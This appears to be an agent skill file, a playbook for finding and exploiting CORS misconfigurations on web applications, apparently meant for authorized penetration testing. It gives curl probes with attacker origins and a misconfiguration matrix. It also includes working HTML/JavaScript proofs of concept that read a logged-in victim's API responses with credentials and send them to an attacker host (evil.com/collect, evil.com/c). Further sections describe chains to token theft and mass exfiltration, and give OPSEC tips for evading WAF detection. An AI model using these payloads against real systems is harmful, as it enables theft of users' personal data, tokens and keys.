---
name: cors
description: CORS misconfiguration exploitation — reflected origin, null origin, trusted-subdomain abuse, regex-validation bypass, and credentialed cross-origin data theft.
allowed-tools: Bash Read Write
metadata:
  when_to_use: "cors cross-origin access-control-allow-origin acao acac preflight withcredentials origin reflection null origin"
  mitre_attack: T1190
  subdomain: execution
  tags: web-application, cors, origin, cross-origin, data-exfiltration
---

# CORS Misconfiguration Playbook

A permissive `Access-Control-Allow-Origin` (ACAO) becomes critical the moment it
is paired with `Access-Control-Allow-Credentials: true` (ACAC) — any origin the
server reflects can read authenticated responses (PII, API keys, CSRF tokens).
ACAO alone (no credentials) is usually Low unless the endpoint serves secrets to
unauthenticated requests.

## 1. Detection — probe origin reflection
```bash
# Reflected-origin + credentials = the critical case
for o in "https://evil.com" "null" "https://<TARGET>.evil.com" "https://evil.com.<TARGET>"; do
  echo "== Origin: $o =="
  curl -s -D- -o /dev/null "https://<TARGET>/api/account" -H "Origin: $o" \
    | grep -i "access-control-allow-origin\|access-control-allow-credentials"
done

# Preflight behaviour (which methods/headers are allowed cross-origin)
curl -s -D- -o /dev/null -X OPTIONS "https://<TARGET>/api/account" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization" \
  | grep -i "access-control-"
```
A response echoing `Access-Control-Allow-Origin: https://evil.com` **and**
`Access-Control-Allow-Credentials: true` confirms exploitable reflection.

## 2. Misconfiguration matrix

| Class | Server behaviour | Exploit origin |
|---|---|---|
| Origin reflection | ACAO echoes any `Origin` + ACAC true | `https://evil.com` |
| `null` allowed | ACAO: null + ACAC true | sandboxed iframe / `data:`/`file:` (sends `Origin: null`) |
| Wildcard + creds (browser-blocked, but check tooling) | `ACAO: *` with secrets | only if creds not required |
| Suffix match flaw | allows `*target.com` | `https://evil-target.com` |
| Prefix match flaw | allows `target.com*` | `https://target.com.evil.com` |
| Unescaped dot in regex | `^https://app.target.com$` | `https://appxtarget.com` |
| Trusted subdomain + XSS | allows `*.target.com` | XSS on any subdomain → same-site fetch |
| Pre-domain confusion | naive `contains("target.com")` | `https://target.com.evil.com`, `https://eviltarget.com` |

## 3. Exploit PoC — credentialed cross-origin read
```html
<!-- host on attacker origin; victim must be authenticated to <TARGET> -->
<script>
  const url = "https://<TARGET>/api/account";
  fetch(url, { credentials: "include" })
    .then(r => r.text())
    .then(data => navigator.sendBeacon("https://evil.com/collect", data));
</script>
```
For `null`-origin servers, deliver the same script inside a sandboxed iframe so
the browser sends `Origin: null`:
```html
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  &lt;script&gt;fetch('https://<TARGET>/api/account',{credentials:'include'})
   .then(r=&gt;r.text()).then(d=&gt;fetch('https://evil.com/c?d='+encodeURIComponent(d)));&lt;/script&gt;">
</iframe>
```

## 4. Chains
- **CORS → token theft → CSRF**: steal the anti-CSRF token from a reflected
  JSON response, then forge state-changing requests that previously looked
  protected.
- **Subdomain XSS → CORS**: server trusts `*.target.com`; an XSS (even DOM-only)
  on a forgotten subdomain runs in an allowed origin and reads the main API.
- **CORS → API key / PII exfil**: any endpoint returning bearer tokens, account
  data, or internal config becomes a one-click mass-exfil primitive.

## 5. Tools
- **Corsy** — fast misconfiguration scanner (`python corsy.py -u https://<TARGET>`)
- **CORScanner** — origin-reflection + regex-flaw detection
- Burp Suite — *CORS* checks (active scan) + manual `Origin` fuzzing in Repeater

## 6. Detection signatures & OPSEC

| Indicator | Detection method | OPSEC note |
|---|---|---|
| Repeated `Origin:` variants from one IP | WAF / access-log anomaly | Throttle probes; reuse a single canary origin |
| `OPTIONS` flood (preflight fuzzing) | Rate-based WAF rule | Test one endpoint at a time |
| Beacon to external collector | Egress/DNS monitoring | Use an in-scope collector during authorized tests |

## Decision Gate: CORS confirmed → exploitation
- [ ] ACAO reflects an attacker-controlled origin (or `null`)
- [ ] ACAC is `true` (or the endpoint serves secrets without auth)
- [ ] A sensitive response body is readable cross-origin
- [ ] PoC exfiltrates real data from an authenticated victim context
If all checked, escalate per `finding-protocol`; otherwise downgrade to
informational (ACAO without credentials/secrets).
